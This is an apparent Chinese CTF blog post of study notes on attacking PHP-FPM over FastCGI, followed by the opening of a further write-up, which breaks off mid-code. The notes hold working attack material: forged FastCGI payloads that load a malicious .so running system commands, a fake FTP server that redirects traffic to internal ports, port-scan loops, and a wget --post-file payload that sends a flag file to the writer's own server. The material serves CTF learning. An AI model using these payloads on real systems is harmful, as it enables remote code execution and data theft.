按FastCGI协议传输的内容分为header和body两部分\ntypedef struct { /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; 先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding\nheader中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求\n当type=4时，表明消息中包含的数据为某个name-value对，比如\n{ \u0026#39;GATEWAY_INTERFACE\u0026#39;: \u0026#39;FastCGI/1.0\u0026#39;, \u0026#39;REQUEST_METHOD\u0026#39;: \u0026#39;GET\u0026#39;, \u0026#39;SCRIPT_FILENAME\u0026#39;: \u0026#39;/var/www/html/index.php\u0026#39;, \u0026#39;SCRIPT_NAME\u0026#39;: \u0026#39;/index.php\u0026#39;, \u0026#39;QUERY_STRING\u0026#39;: \u0026#39;?a=1\u0026amp;b=2\u0026#39;, \u0026#39;REQUEST_URI\u0026#39;: \u0026#39;/index.php?a=1\u0026amp;b=2\u0026#39;, \u0026#39;DOCUMENT_ROOT\u0026#39;: \u0026#39;/var/www/html\u0026#39;, \u0026#39;SERVER_SOFTWARE\u0026#39;: \u0026#39;php/fcgiclient\u0026#39;, \u0026#39;REMOTE_ADDR\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;REMOTE_PORT\u0026#39;: \u0026#39;12345\u0026#39;, \u0026#39;SERVER_ADDR\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;SERVER_PORT\u0026#39;: \u0026#39;80\u0026#39;, \u0026#39;SERVER_NAME\u0026#39;: \u0026#34;localhost\u0026#34;, \u0026#39;SERVER_PROTOCOL\u0026#39;: \u0026#39;HTTP/1.1\u0026#39; } 其中SCRIPT_FILENAME就是php-fpm会去执行的文件，由于5.3.9版本引入了security.limit_extensions的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过find / -name \u0026quot;*.php\u0026quot;来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置FASTCGI_PARAMS来动态修改php的设置，可以利用这两项\n\u0026#39;PHP_VALUE\u0026#39;: \u0026#39;auto_prepend_file = php://input\u0026#39;, \u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\u0026#39; 来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）\n攻击思路\u0026amp;\u0026amp;例题 伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去\n远程攻击php-fpm 这里是p牛的脚本，兼容py2\u0026amp;3，默认-p 9000，-c \u0026lt;?php phpinfo();?\u0026gt;\npython fpm.py target_ip /var/www/html/index.php -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; 我们需要改动的只有params部分的PHP_ADMIN_VALUE\n\u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\\nextension = /home/amelia/TEMP/fpm/wuhu.so\u0026#39;, 成功\n需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用_占位即可\npython fpm.py target_ip _ -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; SSRF攻击本地php-fpm 利用gopher://协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了\n构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走\np牛脚本生成urlencode之后的tcp数据流 加gopher://127.0.0.1:9000前缀 梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx [强网青少 2021]SSRF \u0026lt;?php highlight_file(__FILE__); //like fpm? class Crawl{ public $url; function __construct($url){ if(substr($url,0,7)===\u0026#34;http://\u0026#34;){ $this-\u0026gt;url = $url; }else{ $this-\u0026gt;url = \u0026#34;http://127.0.0.1/\u0026#34;; } } public function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } function __destruct(){ $this-\u0026gt;curl($this-\u0026gt;url); } } if($_COOKIE[\u0026#34;login\u0026#34;]==\u0026#39;1\u0026#39;){ unserialize($_COOKIE[\u0026#34;crawldata\u0026#34;]); }else{ if(isset($_GET[\u0026#34;url\u0026#34;])){ $crl = new Crawl($_GET[\u0026#34;url\u0026#34;]); }else{ echo \u0026#34;no\u0026#34;; } } ?\u0026gt; 用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了\n$a = new Crawl(); $a -\u0026gt; url = \u0026#34;gopher://127.0.0.1:9001/_xxxxxxxx\u0026#34;; // $a -\u0026gt; url = \u0026#34;dict://127.0.0.1:80/info\u0026#34;; // $a -\u0026gt; url = \u0026#34;file:///proc/net/arp\u0026#34;; echo urlencode(serialize($a)); 将序列化之后的结果传入crawldata\n结合ftp\u0026amp;PASV mode攻击本地php-fpm ftp使用PASV模式转发ftp-data 先简单测试ftp连接进行抓包\n其中的227 Entering Passive Mode (192,168,187,3,230,20)的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900\n可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载\n我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回(127,0,0,1,0,12345)来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server\n# 192.168.187.1 import socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#34;215 UNIX Type: L8\\r\\n\u0026#34;) conn.recv(0xff) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) 在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口\nphp加载恶意.so文件 修改php.ini /etc/php/7.4/cli/php.ini\n[PHP] extension=/home/amelia/TEMP/fpm/wuhu.so C源码\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;touch /home/amelia/TEMP/fpm/pwned\u0026#34;); } 编译为.so\ngcc wuhu.c -o wuhu.so --shared -fPIC 运行php即触发恶意.so\n令php使用ftp:// /etc/php/7.4/cli/php.ini\nallow_url_fopen = On ftp读 注意后面的路径都需要绝对路径\n\u0026lt;?php @var_dump(file_get_contents($argv[1])); php ftp_read.php \u0026#39;ftp://test:test@192.168.187.3/home/test/flag.txt\u0026#39; ftp写\n\u0026lt;?php @var_dump(file_put_contents($argv[1], $agrv[2])); php ftp_write.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;hello, world\u0026#39; 但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……\n覆盖已存在文件\n\u0026lt;?php $context = stream_context_create(array(\u0026#39;ftp\u0026#39; =\u0026gt; array(\u0026#39;overwrite\u0026#39; =\u0026gt; true))); @var_dump(file_put_contents($argv[1], $argv[2], 0, $context)); php ftp_write_2.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;newwwwew\u0026#39; 令php使用ftp://并转发FTP-DATA 将上面的操作用wireshark抓个包看看流量\n可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发\n不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令\n将上面的ftp-server修改一下，将229响应设为了000\nimport socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#34;550 Could not get file size.\\r\\n\u0026#34;) print(conn.recv(0xff)) # responese with 000 , not 229 conn.send(b\u0026#39;000 use PASV then\\r\\n\u0026#39;) # then php will send PASV command print(conn.recv(0xff)) # response to PASV command conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) 成功转发\n使用ftp://将payload打向fpm 结合上面几个实例应该就很清晰了，思路就是：\n编写包含执行系统命令的恶意.so 打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(\u0026lsquo;ftp://xxx\u0026rsquo;,$payload) 用file_put_contents(\u0026rsquo;/tmp/wuhu.so\u0026rsquo;,$_POST[\u0026lsquo;data\u0026rsquo;])的形式将.so传入 如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了 这里的完美栗子当然是赵总的三句话（指路赵总博客-\u0026gt;WMCTF2021-Web-Make PHP Great Again And Again WriteUp\n[WMCTF 2021]Make PHP Great Again And Again 思路先放在前面：找到fpm端口-\u0026gt;搭建恶意ftp_server 将.so文件转发至fpm端口-\u0026gt;利用.so文件执行命令-\u0026gt;拿flag\n题目代码只有三句话\n\u0026lt;?php highlight_file(__FILE__); @eval($_GET[\u0026#39;glzjin\u0026#39;]); 直接看phpinfo();会500，用get_cfg_var获取配置项\n/?glzjin=var_dump(get_cfg_var(%27disable_functions%27)); string(657) \u0026#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive\u0026#34; 只能说该禁的都禁了；再康康allow_url_fopen和include\nstring(1) \u0026#34;1\u0026#34; string(0) \u0026#34;\u0026#34; 再康康open_basedir\n/?glzjin=var_dump(get_cfg_var(%27open_basedir%27)); string(14) \u0026#34;/var/www/html/\u0026#34; emmmmmmmmm 这个之后也需要绕过\n用tcp://伪协议扫一下本机开放的端口\nfor($i=0;$i\u0026lt;65535;$i++) { $t=stream_socket_server(\u0026#34;tcp://0.0.0.0:\u0026#34;.$i,$ee,$ee2); if($ee2 === \u0026#34;Address already in use\u0026#34;) { var_dump($i); } } 或者file_get_contents和error_get_last获取到请求中发出的错误进行循环判断也可以进行端口扫描\nfor($i=0;$i\u0026lt;65535;$i++) { $t=file_get_contents(\u0026#39;http://127.0.0.1:\u0026#39;.$i); if(!strpos(error_get_last()[\u0026#39;message\u0026#39;], \u0026#34;Connection refused\u0026#34;)) { var_dump($i); } } int(11451) int(37114) int(48748) 找到了fpm端口11451\n之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的\n$socket = stream_socket_server(\u0026#34;tcp://0.0.0.0:46819\u0026#34;, $errno, $errstr); if (!$socket) { echo \u0026#34;$errstr ($errno)\u0026lt;br /\u0026gt;\\n\u0026#34;; } else { while ($conn = stream_socket_accept($socket)) { fwrite($conn, \u0026#34;210 Fake FTP\\n\u0026#34;); $line = fgets($conn); echo $line; // USER fwrite($conn, \u0026#34;230 Login successful\\n\u0026#34;); $line = fgets($conn); echo $line; // TYPE fwrite($conn, \u0026#34;200 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // SIZE fwrite($conn, \u0026#34;550 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // EPSV fwrite($conn, \u0026#34;500 wtf\\n\u0026#34;); $line = fgets($conn); echo $line; // PASV // $ip = \u0026#39;192.168.1.4\u0026#39;; $ip = \u0026#39;127.0.0.1\u0026#39;; $port = 11451; $porth = floor($port / 256); $portl = $port % 256; fwrite($conn, \u0026#34;227 Entering Passive Mode. \u0026#34;.str_replace(\u0026#39;.\u0026#39;,\u0026#39;,\u0026#39;,$ip).\u0026#34;,$porth,$portl\\n\u0026#34;); $line = fgets($conn); echo $line; // STOR fwrite($conn, \u0026#34;125 GOGOGO!\\n\u0026#34;); sleep(1); fwrite($conn, \u0026#34;226 Thanks!\\n\u0026#34;); fclose($conn); } fclose($socket); } urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些\n\u0026#39;PHP_ADMIN_VALUE\u0026#39;: \u0026#39;allow_url_include = On\\nopen_basedir = /\\nextension = /tmp/wuhu.so\u0026#39;, 覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下\n注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; %01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00 /?glzjin=eval($_POST[%27a%27]); POST: a=$payload=urldecode(\u0026#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00\u0026#39;);var_dump(file_put_contents(\u0026#39;ftp://127.0.0.1:46819/wuhu\u0026#39;,$payload)); 写恶意.so\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void) { system(\u0026#34;ls / -al \u0026gt; /tmp/p1.txt\u0026#34;); system(\u0026#34;find / -perm -4000 2\u0026gt;/tmp/p2.txt\u0026#34;); system(\u0026#34;cat /flag \u0026gt; /tmp/p3.txt\u0026#34;); } gcc wuhu.c -o wuhu.so --shared -fPIC 传.so\n/?glzjin=eval($_POST[%27a%27]); POST: a=var_dump(file_put_contents(\u0026#39;/tmp/wuhu.so\u0026#39;,$_POST[\u0026#39;data\u0026#39;]));\u0026amp;data=xxxxxxxxxxxxxxxxxxx 试着执行一下命令，成功解除open_basedir的限制\n但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊\n正常来说，只有open_basedir被解放后才可以scandir(\u0026rsquo;/\u0026rsquo;)（没有的话是只可以scandir(\u0026rsquo;/var/www/html\u0026rsquo;)），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir(\u0026rsquo;/\u0026rsquo;)都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行\n之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了\n不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了\n***[蓝帽杯 2021]One Pointer PHP yysy，确实没时间复现（复现赵总的题让我有心理阴影了）\n我就先云一下，对8起\n参考：wp1 | wp2\n攻击unix socket模式下的php-fpm 由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是stream_socket_client建立一个unix socket连接，然后写入tcp流来通信\n\u0026lt;?php $sock=stream_socket_client(\u0026#39;unix:///run/php/php7.3-fpm.sock\u0026#39;);fputs($sock,base64_decode($_POST[\u0026#39;A\u0026#39;]));var_dump(fread($sock, 4096));?\u0026gt; [*CTF 2019]Echohub 前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；这里是参考wp\n从phpinfo可以看到disable_functions\nfile_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv 考虑用create_function来rce，不过还是绕不过disable_functions来执行/readflag\n不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm\n题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动\nfpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个\n拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的\n以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（ fastcgi协议分析与实例 | php-fpm 与 Nginx优化总结\nPHP 连接方式 \u0026amp; PHP-FPM未授权访问漏洞 \u0026amp; *CTF echohub\n浅析php-fpm的攻击方式\nFastcgi协议分析 \u0026amp;\u0026amp; PHP-FPM未授权访问漏洞 \u0026amp;\u0026amp; Exp编写\n【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions\n一点对近况的碎碎念 最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊\n看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样\n这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题\n不过总结是很有必要的，现在的进度是这样：\nphp反序列化：缺 原生类的学习+跟一些实际的链子 python反序列化：完 sqli：差不多完，还得多做点题加深理解 SSTI：完 文件上传：之前9月总结到一半去打hvv了 php-fpm：完 GraphQL：完 很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：\nssrf：不熟练 xss：做题遇到都是躲着走 js圆形污染：跟上面那个总是一起出现 xxe xsleaks 还有java，这个必须得学\n不多说了，冲！！！\n","date":"2021-11-18T00:03:25+08:00","permalink":"https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/","section":"posts","tags":["PHP","php-fpm"],"title":"攻击PHP-FPM学习笔记"},{"categories":["CTF"],"contents":"FakeWget 利用sh下grep命令正则缺陷绕过正则检查\n这个题，就非常的可惜，具体的就不说了，太丢人了，总之十分拉跨，特别可惜，究极下饭。\n扫目录，得到/console，/wget，/flag页面得到提示flag在/flag_is_here\n/wget可以发送url进行wget的操作，跟curl一样，也是可以发送post请求滴，这里对输入的url有检测，不允许有空格和一些特殊字符\n这里其实有个原题[纵横杯 2020]magic_download，几乎是一样的，sh在grep时可以用换行的操作来绕过\npayload\nfunction senduri() { var uri = \u0026#39;http://your_vps_ip:port/\\\\n?\\t--post-file=flag_is_here\u0026#39; var encrypt = new JSEncrypt(); publicKey = \u0026#39;-----BEGIN PUBLIC KEY-----\\ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\\ eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\\ +f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\\ MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\\ 94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\\ H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\\ rwIDAQAB\\ -----END PUBLIC KEY-----\u0026#39;; encrypt.setPublicKey(publicKey); encryptdata = encrypt.encrypt(uri); $.post(\u0026#34;/wget\u0026#34;, { encryptdata: encryptdata }); $.get(\u0026#34;/wget\u0026#34;, {}); } EasyWAF different cookie means node pg vuln\npay attention to the hint different cookie different means\n他妈的 经典比赛结束找到原题，真一模一样，吐了\nhttps://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard\nhttps://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py\n#!/usr/bin/node /** * @HITCON CTF 2017 * @Author Orange Tsai */ const qs = require(\u0026#34;qs\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const pg = require(\u0026#34;pg\u0026#34;); const mysql = require(\u0026#34;mysql\u0026#34;); const crypto = require(\u0026#34;crypto\u0026#34;); const express = require(\u0026#34;express\u0026#34;); const pool = mysql.createPool({ connectionLimit: 100, host: \u0026#34;localhost\u0026#34;, user: \u0026#34;ban\u0026#34;, password: \u0026#34;ban\u0026#34;, database: \u0026#34;bandb\u0026#34;, }); const client = new pg.Client({ host: \u0026#34;localhost\u0026#34;, user: \u0026#34;userdb\u0026#34;, password: \u0026#34;userdb\u0026#34;, database: \u0026#34;userdb\u0026#34;, }); client.connect(); const KEYWORDS = [ \u0026#34;select\u0026#34;, \u0026#34;union\u0026#34;, \u0026#34;and\u0026#34;, \u0026#34;or\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34; \u0026#34; ] function waf(string) { for (var i in KEYWORDS) { var key = KEYWORDS[i]; if (string.toLowerCase().indexOf(key) !== -1) { return true; } } return false; } const app = express(); app.use((req, res, next) =\u0026gt; { var data = \u0026#34;\u0026#34;; req.on(\u0026#34;data\u0026#34;, (chunk) =\u0026gt; { data += chunk}) req.on(\u0026#34;end\u0026#34;, () =\u0026gt;{ req.body = qs.parse(data); next(); }) }) app.all(\u0026#34;/*\u0026#34;, (req, res, next) =\u0026gt; { if (\u0026#34;show_source\u0026#34; in req.query) { return res.end(fs.readFileSync(__filename)); } if (req.path == \u0026#34;/\u0026#34;) { return next(); } var ip = req.connection.remoteAddress; var payload = \u0026#34;\u0026#34;; for (var k in req.query) { if (waf(req.query[k])) { payload = req.query[k]; break; } } for (var k in req.body) { if (waf(req.body[k])) { payload = req.body[k]; break; } } if (payload.length \u0026gt; 0) { var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`; } else { var sql = `SELECT ?,?,?`; } return pool.query(sql, [ip, payload, payload], (err, rows) =\u0026gt; { var sql = `SELECT * FROM blacklists WHERE ip=?`; return pool.query(sql, [ip], (err,rows) =\u0026gt; { if ( rows.length == 0) { return next(); } else { return res.end(\u0026#34;Shame on you\u0026#34;); } }); }); }); app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { var sql = `SELECT * FROM blacklists GROUP BY ip`; return pool.query(sql, [], (err,rows) =\u0026gt; { res.header(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); var html = \u0026#34;\u0026lt;pre\u0026gt;Here is the \u0026lt;a href=/?show_source=1\u0026gt;source\u0026lt;/a\u0026gt;, thanks to Orange\\n\\n\u0026lt;h3\u0026gt;Hall of Shame\u0026lt;/h3\u0026gt;(delete every 60s)\\n\u0026#34;; for(var r in rows) { html += `${parseInt(r)+1}. ${rows[r].ip}\\n`; } return res.end(html); }); }); app.post(\u0026#34;/reg\u0026#34;, (req, res) =\u0026gt; { var username = req.body.username; var password = req.body.password; if (!username || !password || username.length \u0026lt; 4 || password.length \u0026lt; 4) { return res.end(\u0026#34;Bye\u0026#34;); } password = crypto.createHash(\u0026#34;md5\u0026#34;).update(password).digest(\u0026#34;hex\u0026#34;); var sql = `INSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING`; return client.query(sql.split(\u0026#34;;\u0026#34;)[0], (err, rows) =\u0026gt; { if (rows \u0026amp;\u0026amp; rows.rowCount == 1) { return res.end(\u0026#34;Reg OK\u0026#34;); } else { return res.end(\u0026#34;User taken\u0026#34;); } }); }); app.listen(31337, () =\u0026gt; { console.log(\u0026#34;Listen OK\u0026#34;); }); 涉及到的主要知识点有三个，一个一个说。\nCVE-2017-16082: node-progresql-rce 参考：node.js + postgres 从注入到Getshell | vulhub: node/CVE-2017-16082 | PostgreSQL 认证方式详解\ndocker中的示例app.js，之后连上docker中的app.js用vscode远程调试\nconst Koa = require(\u0026#39;koa\u0026#39;) const { Client } = require(\u0026#39;pg\u0026#39;) const app = new Koa() const client = new Client({ user: \u0026#34;postgres\u0026#34;, password: \u0026#34;postgres\u0026#34;, database: \u0026#34;example\u0026#34;, host: 